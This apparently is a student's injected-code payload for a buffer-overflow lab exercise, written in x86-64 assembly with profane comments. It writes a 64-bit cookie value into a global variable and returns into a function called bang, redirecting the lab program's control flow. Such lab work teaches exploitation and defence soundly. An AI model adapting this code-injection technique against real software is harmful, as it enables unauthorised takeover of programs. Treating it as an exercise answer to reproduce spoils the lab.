movq $0x00602308, %r12			#addr of global_value to r12
movq $0x285e1ebb, (%r12)		#cookie (0x61bb9357285e1ebb) to glob val
movq $0x61bb9357, 4(%r12)		#2nd part of cookie (becacuse it's 64 fucking bits) to glob val
pushq $0x00401020						#addr of bang to stack
retq												#return 'at shiiet
